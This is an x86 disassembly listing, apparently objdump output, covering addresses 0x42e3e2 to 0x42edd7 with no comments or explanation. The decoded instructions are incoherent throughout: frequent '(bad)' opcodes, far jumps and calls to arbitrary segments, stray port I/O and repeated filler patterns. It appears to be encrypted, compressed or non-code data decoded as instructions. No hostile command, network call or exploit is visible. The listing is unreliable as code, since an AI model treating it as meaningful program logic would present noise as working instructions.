  42e3e2:	jmp    FWORD PTR [ebx-0x74]
  42e3e5:	jg     0x42e40a
  42e3e7:	push   es
  42e3e8:	mov    DWORD PTR [edx+0x184e5976],ebx
  42e3ee:	out    0xbf,al
  42e3f0:	cld    
  42e3f1:	push   ebp
  42e3f2:	jae    0x42e3cd
  42e3f4:	call   0xa8cb:0xbe41afd2
  42e3fb:	mov    edx,0xd8e2fa2a
  42e400:	push   edi
  42e401:	jge    0x42e451
  42e403:	jb     0x42e3e9
  42e405:	(bad)  
  42e406:	rcl    ebx,1
  42e408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e409:	adc    al,0xfa
  42e40b:	mov    al,ds:0xedd3c2ba
  42e410:	lahf   
  42e411:	test   al,0x7e
  42e413:	ja     0x42e435
  42e415:	popa   
  42e416:	inc    eax
  42e417:	mov    DWORD PTR [esi-0x6ab14384],eax
  42e41d:	loope  0x42e42b
  42e41f:	jp     0x467f4fc6
  42e425:	sti    
  42e426:	adc    eax,DWORD PTR ds:0x56715640
  42e42c:	retf   
  42e42d:	mov    ecx,0x1c7ebe1e
  42e432:	xchg   ebp,eax
  42e433:	fadd   DWORD PTR [ebx+0x5b3779a2]
  42e439:	test   BYTE PTR [esi-0xa],ch
  42e43c:	aaa    
  42e43d:	std    
  42e43e:	mov    cl,0x27
  42e440:	scas   eax,DWORD PTR es:[edi]
  42e441:	inc    edx
  42e442:	xor    eax,0x3361b395
  42e447:	shl    BYTE PTR [ecx],1
  42e449:	ret    
  42e44a:	pusha  
  42e44b:	jle    0x42e458
  42e44d:	cmc    
  42e44e:	out    dx,eax
  42e44f:	fbld   TBYTE PTR [eax]
  42e451:	xor    eax,0x130d69a7
  42e456:	ret    0x64bf
  42e459:	push   es
  42e45a:	xor    cl,BYTE PTR [edx]
  42e45c:	jne    0x42e470
  42e45e:	add    eax,0x98385bed
  42e463:	aas    
  42e464:	js     0x42e466
  42e466:	js     0x42e4c9
  42e468:	xchg   ecx,eax
  42e469:	scas   eax,DWORD PTR es:[edi]
  42e46a:	sub    BYTE PTR [ecx],al
  42e46c:	dec    esi
  42e46d:	sbb    eax,DWORD PTR [eax]
	...
  42e4d3:	add    BYTE PTR [eax],al
  42e4d5:	add    dl,ah
  42e4d7:	mov    ebp,0xe7dfc7dc
  42e4dc:	sti    
  42e4dd:	mov    ebp,0xe093f290
  42e4e2:	dec    edi
  42e4e3:	lock popa 
  42e4e5:	push   ss
  42e4e6:	lock add DWORD PTR [bx+si],eax
  42e4ea:	add    BYTE PTR [ecx],al
  42e4ec:	add    BYTE PTR [eax],al
  42e4ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4ef:	mov    ds:0x927cea91,eax
  42e4f4:	push   esi
  42e4f5:	jb     0x42e4fe
  42e4f7:	jo     0x42e4bd
  42e4f9:	jp     0x42e4b5
  42e4fb:	loop   0x42e4b5
  42e4fd:	inc    eax
  42e4fe:	dec    esp
  42e4ff:	adc    DWORD PTR [esi],ebp
  42e501:	out    0x6f,eax
  42e503:	ins    DWORD PTR es:[edi],dx
  42e504:	jg     0x42e557
  42e506:	lds    edi,FWORD PTR [eax]
  42e508:	add    DWORD PTR [edi+ebp*2],0x1fe7f1be
  42e50f:	(bad)  
  42e510:	dec    ebx
  42e511:	cdq    
  42e512:	mov    eax,0xb146c18d
  42e517:	das    
  42e518:	lock add al,BYTE PTR [esi+0x2]
  42e51c:	mov    dl,0x13
  42e51e:	stc    
  42e51f:	push   ebx
  42e520:	out    dx,al
  42e521:	mov    ebx,eax
  42e523:	out    dx,al
  42e524:	xor    al,0x8
  42e526:	outs   dx,BYTE PTR ds:[esi]
  42e527:	outs   dx,DWORD PTR ds:[esi]
  42e528:	scas   eax,DWORD PTR es:[edi]
  42e529:	and    al,0x50
  42e52b:	pop    ecx
  42e52c:	pop    es
  42e52d:	loope  0x42e53d
  42e52f:	in     al,dx
  42e530:	pop    edx
  42e531:	(bad)  
  42e532:	cmc    
  42e533:	imul   cl
  42e535:	sub    BYTE PTR [ecx+0x7c],dh
  42e538:	ficomp WORD PTR [esi]
  42e53a:	outs   dx,BYTE PTR ds:[esi]
  42e53b:	icebp  
  42e53c:	sub    al,0x1b
  42e53e:	daa    
  42e53f:	mov    al,dh
  42e541:	mov    gs,WORD PTR [edx+0x546c1980]
  42e547:	or     edx,ecx
  42e549:	mov    eax,ds:0xeefcfee1
  42e54e:	imul   edx,DWORD PTR [ebx-0x79ea06da],0xffffffd8
  42e555:	std    
  42e556:	and    ebx,DWORD PTR [ebp-0x6e3bb8f6]
  42e55c:	inc    eax
  42e55d:	in     eax,dx
  42e55e:	cli    
  42e55f:	jmp    0x42e59c
  42e561:	pushf  
  42e562:	fild   DWORD PTR [edi-0x4e5b7a7d]
  42e568:	dec    ecx
  42e569:	(bad)  
  42e56b:	jae    0x42e575
  42e56d:	jl     0x42e556
  42e56f:	faddp  st(2),st
  42e571:	dec    eax
  42e572:	mov    ah,0x10
  42e574:	jmp    0xcd58:0x1e899c74
  42e57b:	dec    ebp
  42e57c:	xchg   DWORD PTR [ecx-0x68],ecx
  42e57f:	(bad)  
  42e580:	sub    al,0x7a
  42e582:	mov    ch,0xe5
  42e584:	mov    ch,0xa8
  42e586:	cwde   
  42e587:	fmul   DWORD PTR [esp+ebx*1]
  42e58a:	xchg   ebp,eax
  42e58b:	data16 or al,0x57
  42e58e:	pop    edx
  42e58f:	ret    
  42e590:	dec    eax
  42e591:	shl    DWORD PTR [eax],1
  42e593:	inc    esi
  42e594:	bound  esi,QWORD PTR [edx-0x3f]
  42e597:	repz ret 0x72a3
  42e59b:	loopne 0x42e53c
  42e59d:	pop    es
  42e59e:	rcr    DWORD PTR [edx+0x3dd4000c],0x1d
  42e5a5:	retf   0x682d
  42e5a8:	dec    eax
  42e5a9:	call   0x3b4b1bd5
  42e5ae:	mov    edi,0x7d253b2e
  42e5b3:	mov    bl,0x82
  42e5b5:	mov    edi,0xca557aa4
  42e5ba:	inc    ecx
  42e5bb:	out    0xeb,eax
  42e5bd:	pop    ebx
  42e5be:	leave  
  42e5bf:	mov    DWORD PTR [esi],0xd76c199d
  42e5c5:	or     dh,bl
  42e5c7:	push   edi
  42e5c8:	push   0x16
  42e5ca:	hlt    
  42e5cb:	push   eax
  42e5cc:	xchg   ebp,eax
  42e5cd:	ja     0x42e566
  42e5cf:	sbb    esi,ecx
  42e5d1:	pop    ds
  42e5d2:	stos   DWORD PTR es:[edi],eax
  42e5d3:	nop
  42e5d4:	(bad)  
  42e5d5:	jmp    0x42e582
  42e5d7:	xchg   esi,eax
  42e5d8:	std    
  42e5d9:	retf   0xa806
  42e5dc:	stos   BYTE PTR es:[edi],al
  42e5dd:	push   0xffffffd8
  42e5df:	addr16 cmp ecx,ecx
  42e5e2:	dec    edx
  42e5e3:	mov    ds:0xea130c81,al
  42e5e8:	pop    ebx
  42e5e9:	loop   0x42e5a5
  42e5eb:	dec    ebp
  42e5ec:	aad    0x26
	...
  42e656:	push   ebp
  42e657:	cmp    dh,cl
  42e659:	adc    bh,ch
  42e65b:	neg    bh
  42e65d:	jge    0x42e5f1
  42e65f:	xchg   ebp,eax
  42e660:	jns    0x42e693
  42e662:	xchg   edx,eax
  42e663:	jne    0x42e618
  42e665:	imul   esp,DWORD PTR [edi-0xf],0x1
  42e669:	add    BYTE PTR [eax],al
  42e66b:	add    DWORD PTR [eax],eax
  42e66d:	add    BYTE PTR [esi+0x65ccc8f9],ch
  42e673:	and    DWORD PTR [ebp+0x15088613],ecx
  42e679:	call   0x35e7:0x4fb1c4fa
  42e680:	enter  0xd423,0x8c
  42e684:	cmp    al,0x9c
  42e686:	cmp    DWORD PTR [edi-0x12e21a5b],ecx
  42e68c:	cwde   
  42e68d:	xchg   DWORD PTR [ebx-0x6f],edi
  42e690:	add    cl,BYTE PTR [esi-0x779ead10]
  42e696:	sbb    eax,0xf3187676
  42e69b:	adc    ebx,DWORD PTR [edi+0xbcb1a11]
  42e6a1:	jmp    0x42e6d4
  42e6a3:	sub    eax,0x3f0b2fb
  42e6a8:	sti    
  42e6a9:	(bad)  
  42e6aa:	ficom  WORD PTR [ecx+esi*8+0x196f4fe9]
  42e6b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e6b2:	pop    ds
  42e6b3:	pop    esi
  42e6b4:	mov    ecx,0x2cc99c41
  42e6b9:	call   0x7b3edc6
  42e6be:	inc    eax
  42e6bf:	dec    ebx
  42e6c0:	arpl   WORD PTR [edi],ax
  42e6c2:	mov    ch,0x29
  42e6c4:	clc    
  42e6c5:	pop    eax
  42e6c6:	pop    esp
  42e6c7:	mov    bh,0x2d
  42e6c9:	or     bh,BYTE PTR [edi]
  42e6cb:	pop    ebp
  42e6cc:	popf   
  42e6cd:	adc    DWORD PTR [eax],ecx
  42e6cf:	(bad)  
  42e6d0:	mov    cl,0x86
  42e6d2:	aad    0x7f
  42e6d4:	pop    esp
  42e6d5:	mov    ebx,DWORD PTR [edx+0x32]
  42e6d8:	cdq    
  42e6d9:	int    0x19
  42e6db:	sahf   
  42e6dc:	lods   al,BYTE PTR ds:[esi]
  42e6dd:	mov    edi,0x9ada98e6
  42e6e2:	ins    BYTE PTR es:[edi],dx
  42e6e3:	ds or  al,0xac
  42e6e6:	push   ebp
  42e6e7:	mov    ch,0x62
  42e6e9:	pop    ds
  42e6ea:	in     al,0x7
  42e6ec:	(bad)  
  42e6ed:	pop    esi
  42e6ee:	push   ss
  42e6ef:	shl    ch,0xd7
  42e6f2:	pop    esp
  42e6f3:	xchg   BYTE PTR [esi+ecx*4-0x7ab336ef],bl
  42e6fa:	mov    ah,0xc4
  42e6fc:	mov    ebp,0x7b1febaf
  42e701:	rol    BYTE PTR [edx+ebp*2],0x94
  42e705:	not    BYTE PTR [edi]
  42e707:	pushf  
  42e708:	xlat   BYTE PTR ds:[ebx]
  42e709:	or     DWORD PTR [ecx-0x50470956],eax
  42e70f:	adc    al,0xe5
  42e711:	cwde   
  42e712:	pop    eax
  42e713:	loope  0x42e791
  42e715:	ret    0x857b
  42e718:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e719:	icebp  
  42e71a:	fbld   TBYTE PTR [eax+0x28]
  42e71d:	lds    ebp,FWORD PTR [eax+0x7d15381]
  42e723:	sub    cl,al
  42e725:	inc    ebx
  42e726:	fcom   DWORD PTR [ecx+0x2474df44]
  42e72c:	retf   
  42e72d:	je     0x42e6cd
  42e72f:	icebp  
  42e730:	cmpxchg ecx,esp
  42e733:	sbb    DWORD PTR [esi-0x6a73ddc2],0x93e28523
  42e73d:	or     al,0xd1
  42e73f:	jne    0x42e738
  42e741:	and    ch,BYTE PTR [ecx+esi*8-0x15fa3357]
  42e748:	retf   
  42e749:	sahf   
  42e74a:	mov    al,ds:0x28271e90
  42e74f:	(bad)  
  42e750:	dec    eax
  42e751:	jb     0x42e714
  42e753:	adc    DWORD PTR [esi+eiz*8-0x5f],ebp
  42e757:	stos   DWORD PTR es:[edi],eax
  42e758:	pop    ds
  42e759:	popa   
  42e75a:	into   
  42e75b:	stos   DWORD PTR es:[edi],eax
  42e75c:	jnp    0x42e7c5
  42e75e:	mov    cl,0x2d
  42e760:	shl    ch,0xe9
  42e763:	std    
  42e764:	sub    eax,0xb96dc382
  42e769:	push   esi
  42e76a:	hlt    
  42e76b:	cmp    dl,BYTE PTR [edi-0x3]
	...
  42e7d6:	pop    edx
  42e7d7:	cmp    DWORD PTR [esi+0x2d],ecx
  42e7da:	outs   dx,DWORD PTR ds:[esi]
  42e7db:	jg     0x42e858
  42e7dd:	jg     0x42e843
  42e7df:	sub    BYTE PTR [esi],cl
  42e7e1:	fcmovu st,st(3)
  42e7e3:	sahf   
  42e7e4:	icebp  
  42e7e5:	out    dx,al
  42e7e6:	repnz add DWORD PTR [bx+si],eax
  42e7ea:	add    BYTE PTR [ecx],al
  42e7ec:	add    BYTE PTR [eax],al
  42e7ee:	adc    DWORD PTR [esi-0x280f38bc],edi
  42e7f4:	pushf  
  42e7f5:	pop    ecx
  42e7f6:	in     eax,dx
  42e7f7:	sub    al,0xff
  42e7f9:	or     al,dh
  42e7fb:	mov    ch,0x54
  42e7fd:	push   esp
  42e7fe:	cli    
  42e7ff:	add    BYTE PTR [esi],0xc3
  42e802:	jmp    0x8867:0xb71b4113
  42e809:	fs std 
  42e80b:	add    al,0x90
  42e80d:	add    ch,BYTE PTR [edx*2+0x2c98e522]
  42e814:	inc    edi
  42e815:	cli    
  42e816:	popa   
  42e817:	xchg   DWORD PTR [edx],esi
  42e819:	bound  esp,QWORD PTR [eax-0x58]
  42e81c:	fdiv   QWORD PTR [ecx]
  42e81e:	jg     0x42e869
  42e820:	xchg   edx,eax
  42e821:	aad    0x41
  42e823:	jmp    0x8ceb:0x8386bea8
  42e82a:	js     0x42e7be
  42e82c:	inc    esi
  42e82d:	pop    ebx
  42e82e:	enter  0x959f,0x6f
  42e832:	pop    ebx
  42e833:	cmc    
  42e834:	loop   0x42e81b
  42e836:	mov    ecx,0xe0dbce56
  42e83b:	js     0x42e845
  42e83d:	push   esi
  42e83e:	icebp  
  42e83f:	jnp    0x42e85c
  42e841:	mov    ah,0x0
  42e843:	inc    ebp
  42e844:	inc    ebx
  42e845:	xlat   BYTE PTR ds:[ebx]
  42e846:	pop    eax
  42e847:	cmp    DWORD PTR [esi+0x5b544ff9],eax
  42e84d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e84e:	dec    ebp
  42e84f:	idiv   DWORD PTR [esi-0x78]
  42e852:	dec    edi
  42e853:	mov    ds:0xed1babd1,eax
  42e858:	mov    edx,0x4f3c24ad
  42e85d:	repnz cli 
  42e85f:	sbb    ch,BYTE PTR [esi]
  42e861:	int3   
  42e862:	aaa    
  42e863:	xchg   ebx,eax
  42e864:	jg     0x42e871
  42e866:	and    BYTE PTR [edx-0x8],bl
  42e869:	inc    edx
  42e86a:	mov    eax,0x6b149ba8
  42e86f:	push   dx
  42e871:	or     al,0xcd
  42e873:	mov    cl,0x39
  42e875:	xchg   edi,eax
  42e876:	out    dx,al
  42e877:	imul   eax,DWORD PTR [ebx+0x6ca42f60],0xffffff94
  42e87e:	mov    al,0x57
  42e880:	push   DWORD PTR [edx+0x37]
  42e883:	pop    es
  42e884:	add    BYTE PTR [edi+ecx*2-0x2c],0xe6
  42e889:	pusha  
  42e88a:	sub    eax,0x7315ae1b
  42e88f:	xadd   DWORD PTR [ecx+0x2200e9c6],edx
  42e896:	stos   BYTE PTR es:[edi],al
  42e897:	ins    DWORD PTR es:[edi],dx
  42e898:	imul   DWORD PTR [ebx+0x20]
  42e89b:	loope  0x42e855
  42e89d:	fst    DWORD PTR [edx]
  42e89f:	push   cs
  42e8a0:	push   edx
  42e8a1:	pop    es
  42e8a2:	mov    ds:0xd76bdd27,al
  42e8a7:	aad    0xeb
  42e8a9:	and    dl,BYTE PTR [ebp+esi*8+0x60]
  42e8ad:	shr    DWORD PTR [ecx+0x55],cl
  42e8b0:	xor    BYTE PTR [ebx],bl
  42e8b2:	or     DWORD PTR [edx],0x7f
  42e8b5:	arpl   WORD PTR [ebx],ax
  42e8b7:	jne    0x42e888
  42e8b9:	push   ss
  42e8ba:	fisub  DWORD PTR [ebp+0x68]
  42e8bd:	mov    ecx,0xe9998e75
  42e8c2:	sbb    eax,0xee0e2dbc
  42e8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e8c8:	dec    edi
  42e8c9:	mov    ds,WORD PTR [ecx-0x3431a8b]
  42e8cf:	mov    ch,BYTE PTR [edx-0x9]
  42e8d2:	inc    ebp
  42e8d3:	push   ebx
  42e8d4:	sub    bl,ch
  42e8d6:	jbe    0x42e858
  42e8d8:	in     eax,0x51
  42e8da:	adc    edi,DWORD PTR [ebx-0x7d]
  42e8dd:	cdq    
  42e8de:	or     esi,DWORD PTR [edi+eax*8]
  42e8e1:	les    ebx,FWORD PTR [edx-0xbee3180]
  42e8e7:	icebp  
  42e8e8:	pop    esp
  42e8e9:	cmp    bl,BYTE PTR ds:0xc4d530
	...
  42e953:	add    BYTE PTR [eax],al
  42e955:	add    bl,al
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x1edc07d5]
  42e963:	mov    al,ds:0xf3671126
  42e968:	add    DWORD PTR [eax],eax
  42e96a:	add    BYTE PTR [ecx],al
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	jno    0x42e9e5
  42e970:	mov    ecx,0x79f2dafe
  42e975:	pop    eax
  42e976:	mov    BYTE PTR [eax+0xf],dh
  42e979:	imul   eax,DWORD PTR [ebp+0x5c991d06],0xffffffad
  42e980:	jmp    0x9124:0x40f01079
  42e987:	ror    esi,1
  42e989:	mov    DWORD PTR [edx],esi
  42e98b:	inc    ebp
  42e98c:	out    dx,al
  42e98d:	mov    ecx,eax
  42e98f:	and    ebp,ecx
  42e991:	(bad)  
  42e992:	out    dx,eax
  42e993:	mov    ds:0xa553e1ea,al
  42e998:	inc    edx
  42e999:	sbb    edx,eax
  42e99b:	sti    
  42e99c:	mov    ss,WORD PTR [edx-0x49]
  42e99f:	inc    edx
  42e9a0:	aam    0xc0
  42e9a2:	pop    ecx
  42e9a3:	or     BYTE PTR gs:0x2c93e9eb,cl
  42e9aa:	mov    DWORD PTR [edi+ebp*2-0x659f5a60],edx
  42e9b1:	inc    esp
  42e9b2:	ins    BYTE PTR es:[edi],dx
  42e9b3:	stos   DWORD PTR es:[edi],eax
  42e9b4:	shl    DWORD PTR [edx+0x2cd9350c],cl
  42e9ba:	lahf   
  42e9bb:	jno    0x42e987
  42e9bd:	scas   al,BYTE PTR es:[edi]
  42e9be:	nop    DWORD PTR [ecx-0x52]
  42e9c2:	mov    esp,0x16b74976
  42e9c7:	jmp    0x6bed:0x432b85b3
  42e9ce:	or     al,0x7f
  42e9d0:	popa   
  42e9d1:	mov    BYTE PTR [ecx],bh
  42e9d3:	adc    eax,0x117852aa
  42e9d8:	mov    BYTE PTR [ecx+0x526180bd],cl
  42e9de:	js     0x42ea28
  42e9e0:	std    
  42e9e1:	ss inc ecx
  42e9e3:	imul   edx,DWORD PTR [edi],0x70
  42e9e6:	push   es
  42e9e7:	jnp    0x42e9ff
  42e9e9:	pop    ebx
  42e9ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9eb:	push   0x5c
  42e9ed:	or     dl,BYTE PTR [edx]
  42e9ef:	mov    ecx,0xb4981e40
  42e9f4:	cmp    ecx,DWORD PTR [ecx]
  42e9f6:	and    BYTE PTR [edi],ch
  42e9f8:	cmp    eax,0x75c99e9a
  42e9fd:	push   cs
  42e9fe:	xchg   edx,eax
  42e9ff:	adc    ah,BYTE PTR [eax+esi*8+0x7ca41eed]
  42ea06:	nop
  42ea07:	loopne 0x42e9a1
  42ea09:	jno    0x42ea1e
  42ea0b:	sub    eax,0xc0f26c18
  42ea10:	addr16 xchg edi,eax
  42ea12:	mov    ebp,0xd7a62f43
  42ea17:	push   ebp
  42ea18:	inc    ebx
  42ea19:	cmp    ch,BYTE PTR [edi]
  42ea1b:	ins    DWORD PTR es:[edi],dx
  42ea1c:	mov    esp,0x2c9178f5
  42ea21:	(bad)  
  42ea22:	rol    BYTE PTR [esi-0x660f8caf],0xbf
  42ea29:	(bad)  
  42ea2a:	jmp    0xa8ae196b
  42ea2f:	inc    ecx
  42ea30:	stos   DWORD PTR es:[edi],eax
  42ea31:	jo     0x42ea54
  42ea33:	out    dx,al
  42ea34:	xlat   BYTE PTR ds:[ebx]
  42ea35:	ficomp DWORD PTR [eax]
  42ea37:	jle    0x42ea44
  42ea39:	push   edx
  42ea3a:	out    dx,al
  42ea3b:	push   DWORD PTR [eax]
  42ea3d:	loope  0x42ea28
  42ea3f:	fld    DWORD PTR [edi-0x3c54450f]
  42ea46:	mov    eax,0x4e566806
  42ea4b:	call   0x5eac:0xc7bc0b1f
  42ea52:	xchg   ecx,eax
  42ea53:	dec    eax
  42ea54:	scas   eax,DWORD PTR es:[edi]
  42ea55:	jnp    0x42e9f5
  42ea57:	cwde   
  42ea58:	dec    ebp
  42ea59:	fist   WORD PTR [esi+0x5f21e606]
  42ea5f:	inc    ecx
  42ea60:	fisttp WORD PTR [ebx]
  42ea62:	cdq    
  42ea63:	xchg   ebx,eax
  42ea64:	mov    dl,bh
  42ea66:	push   ebx
  42ea67:	pushf  
  42ea68:	push   edi
  42ea69:	mov    dh,0x4
  42ea6b:	pand   mm7,QWORD PTR [eax+eax*1]
	...
  42ead3:	add    BYTE PTR [eax],al
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	jl     0x42eaa6
  42eae4:	jbe    0x42ead6
  42eae6:	addr16 hlt 
  42eae8:	add    DWORD PTR [eax],eax
  42eaea:	add    BYTE PTR [ecx],al
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	and    DWORD PTR [edx-0x2926c76d],ebx
  42eaf4:	repnz aaa 
  42eaf6:	mov    edi,ss
  42eaf8:	aad    0x3e
  42eafa:	in     al,dx
  42eafb:	push   es
  42eafc:	dec    esp
  42eafd:	jbe    0x42ea8d
  42eaff:	nop
  42eb00:	add    BYTE PTR [ebx-0x74],bh
  42eb03:	mov    cl,0xda
  42eb05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb06:	mov    ch,cl
  42eb08:	xchg   edx,eax
  42eb09:	test   ecx,ecx
  42eb0b:	sbb    ecx,DWORD PTR [eax]
  42eb0d:	jmp    FWORD PTR [edx+0x64]
  42eb10:	push   eax
  42eb11:	iret   
  42eb12:	xchg   BYTE PTR ds:0x97da9e7b,dh
  42eb18:	out    dx,al
  42eb19:	cmp    DWORD PTR [edi+0x4ebb4d68],edx
  42eb1f:	mov    ebx,0x87943c8d
  42eb24:	mov    dh,dl
  42eb26:	or     DWORD PTR [esi+0x37],0x39
  42eb2a:	dec    eax
  42eb2b:	sbb    DWORD PTR fs:[ecx-0x6e9dcc91],ebp
  42eb32:	(bad)
  42eb37:	cwde   
  42eb38:	bound  ebp,QWORD PTR [ecx+edx*8-0x10f00ba1]
  42eb3f:	dec    esi
  42eb40:	sbb    ebp,0x5041e903
  42eb46:	inc    ebx
  42eb47:	test   DWORD PTR [eax],edx
  42eb49:	jmp    DWORD PTR [eax+0x70c4559d]
  42eb4f:	fs push ebp
  42eb51:	fbstp  TBYTE PTR [edx-0x5a]
  42eb54:	gs sub al,0xee
  42eb57:	mov    eax,DWORD PTR [esi]
  42eb59:	jnp    0x42eb7f
  42eb5b:	adc    DWORD PTR [edi+eax*1+0xf],ebp
  42eb5f:	push   edi
  42eb60:	rcl    DWORD PTR [eax-0x32a186c],cl
  42eb66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb67:	mov    BYTE PTR [eax],dl
  42eb69:	arpl   si,si
  42eb6b:	push   0x24
  42eb6d:	pusha  
  42eb6e:	mov    ebx,0xcc591ca1
  42eb73:	cmp    ebx,DWORD PTR [ebx]
  42eb75:	loop   0x42eb8c
  42eb77:	sub    eax,0x66cf0134
  42eb7c:	in     eax,0xf7
  42eb7e:	lea    esp,[ebx+0x1d]
  42eb81:	cmovg  esi,DWORD PTR [ecx-0x60a16263]
  42eb88:	push   ss
  42eb89:	mov    DWORD PTR [esi-0x61f3a3e5],edx
  42eb8f:	mov    bh,cl
  42eb91:	aas    
  42eb92:	fbstp  TBYTE PTR [ecx-0x7a]
  42eb95:	dec    ebx
  42eb96:	add    BYTE PTR [edi+0x3f9ac81a],dl
  42eb9c:	idiv   DWORD PTR [esi-0x2a2aec18]
  42eba2:	or     BYTE PTR [eax-0x691576d3],0x78
  42eba9:	xchg   ebp,eax
  42ebaa:	or     eax,0x2159c2ab
  42ebaf:	idiv   BYTE PTR [esi]
  42ebb1:	xchg   ebx,eax
  42ebb2:	outs   dx,DWORD PTR ds:[esi]
  42ebb3:	mov    eax,ds:0x6c9689cc
  42ebb8:	stos   DWORD PTR es:[edi],eax
  42ebb9:	cdq    
  42ebba:	inc    esi
  42ebbb:	(bad)  
  42ebbc:	pop    ebp
  42ebbd:	test   al,0x36
  42ebbf:	and    eax,0x152dc4d6
  42ebc4:	stc    
  42ebc5:	fmul   QWORD PTR [edx+0x3f1a3df4]
  42ebcb:	xchg   edi,eax
  42ebcc:	mov    ebx,0x4d7b4901
  42ebd1:	xor    BYTE PTR [eax+0x4a],bh
  42ebd4:	test   edx,esp
  42ebd6:	push   ebx
  42ebd7:	cmc    
  42ebd8:	imul   ebx,DWORD PTR [ecx-0x56d1d10c],0xba642489
  42ebe2:	hlt    
  42ebe3:	mov    cl,0x38
  42ebe5:	add    ebp,0x65
  42ebe8:	call   0xf80807c1
  42ebed:	icebp  
	...
  42ec56:	jle    0x42ec99
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sbb    DWORD PTR [eax+0x7e],0xf56792c6
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	add    BYTE PTR [ecx],al
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	mov    edx,es
  42ec70:	pop    esp
  42ec71:	imul   ebx,DWORD PTR [ecx+0x779d1e96],0x21cc57cc
  42ec7b:	inc    esp
  42ec7c:	std    
  42ec7d:	xchg   esi,eax
  42ec7e:	sbb    bh,ch
  42ec80:	mov    ebx,0x10f01731
  42ec85:	dec    esi
  42ec86:	movsx  ebx,ax
  42ec89:	jb     0x42ec4c
  42ec8b:	cld    
  42ec8c:	out    dx,al
  42ec8d:	inc    ecx
  42ec8e:	xor    DWORD PTR [ebx+0x60],ebp
  42ec91:	icebp  
  42ec92:	adc    al,0xb3
  42ec94:	push   es
  42ec95:	cmp    eax,DWORD PTR [esi+0x6229d253]
  42ec9b:	xchg   edx,eax
  42ec9c:	ins    BYTE PTR es:[edi],dx
  42ec9d:	int3   
  42ec9e:	sub    BYTE PTR [esi],0xe6
  42eca1:	jbe    0x42ecfa
  42eca3:	inc    ecx
  42eca4:	in     al,dx
  42eca5:	dec    esi
  42eca6:	(bad)  
  42eca7:	xor    al,0xad
  42eca9:	push   ecx
  42ecaa:	and    ch,bh
  42ecac:	iret   
  42ecad:	xlat   BYTE PTR ds:[ebx]
  42ecae:	ins    BYTE PTR es:[edi],dx
  42ecaf:	enter  0xf139,0xf1
  42ecb3:	dec    DWORD PTR [esi]
  42ecb5:	or     ebp,esi
  42ecb7:	bound  ecx,QWORD PTR [eax-0x1b]
  42ecba:	mov    eax,0x7b115d6d
  42ecbf:	fcmovb st,st(1)
  42ecc1:	test   eax,0x30fbb85d
  42ecc6:	xor    esi,edi
  42ecc8:	je     0x42ed13
  42ecca:	pop    edx
  42eccb:	adc    al,0x17
  42eccd:	pop    ebx
  42ecce:	mov    cl,0xcf
  42ecd0:	(bad)  
  42ecd1:	cwde   
  42ecd2:	out    dx,al
  42ecd3:	jnp    0x42ecb9
  42ecd5:	ret    
  42ecd6:	and    DWORD PTR [edi-0x5d],ecx
  42ecd9:	sbb    BYTE PTR [esi],dl
  42ecdb:	test   DWORD PTR [eax],esp
  42ecdd:	jo     0x42ec84
  42ecdf:	dec    bl
  42ece1:	and    DWORD PTR ds:0x24bccfef,0x1
  42ece8:	cs cs mov cl,0x62
  42ecec:	mov    eax,ds:0x1880eaa7
  42ecf1:	adc    al,0x41
  42ecf3:	pop    ds
  42ecf4:	mov    BYTE PTR [edx+0x74],0x6d
  42ecf8:	inc    ecx
  42ecf9:	jl     0x42ed76
  42ecfb:	sbb    dl,ch
  42ecfd:	sbb    al,0x60
  42ecff:	dec    edx
  42ed00:	sub    al,0x72
  42ed02:	jne    0x42ecd8
  42ed04:	in     eax,0x82
  42ed06:	add    cl,0x94
  42ed09:	mov    ds:0xf6330b6b,eax
  42ed0e:	lea    ecx,[ebx-0x2c109521]
  42ed14:	pop    esp
  42ed15:	push   cs
  42ed16:	lods   eax,DWORD PTR ds:[esi]
  42ed17:	lods   al,BYTE PTR ds:[esi]
  42ed18:	push   esi
  42ed19:	jmp    0x169af464
  42ed1e:	inc    edx
  42ed1f:	pop    esi
  42ed20:	sub    eax,0x1bf7bea8
  42ed25:	js     0x42ed36
  42ed27:	imul   edx,DWORD PTR [esi+0x1c0f3cb9],0xffffffee
  42ed2e:	fist   DWORD PTR [esi+eiz*2-0x6a]
  42ed32:	push   edx
  42ed33:	mov    gs,ebp
  42ed35:	push   ecx
  42ed36:	test   dl,ch
  42ed38:	int3   
  42ed39:	inc    edi
  42ed3a:	push   esi
  42ed3b:	stos   BYTE PTR es:[edi],al
  42ed3c:	mov    dh,bh
  42ed3e:	sbb    BYTE PTR [eax+0x69],dh
  42ed41:	mov    edi,0xc9511cfc
  42ed46:	outs   dx,BYTE PTR ds:[esi]
  42ed47:	jne    0x42ed12
  42ed49:	jg     0x42edb9
  42ed4b:	(bad)  
  42ed4c:	in     al,0x37
  42ed4e:	cdq    
  42ed4f:	mov    edi,0x768ee849
  42ed54:	dec    edx
  42ed55:	or     al,0x7a
  42ed57:	push   cs
  42ed58:	icebp  
  42ed59:	mov    eax,0xc2d8111d
  42ed5e:	cs repnz pusha 
  42ed61:	sub    DWORD PTR [eax],esp
  42ed63:	jecxz  0x42edd9
  42ed65:	xor    DWORD PTR ds:0x6be02a65,ebp
  42ed6b:	push   edi
  42ed6c:	pop    edi
  42ed6d:	test   BYTE PTR [eax],al
	...
  42edd3:	add    BYTE PTR [eax],al
  42edd5:	add    BYTE PTR [edx],ch
  42edd7:	imul   BYTE PTR [edi+0x7fd9ffd8]
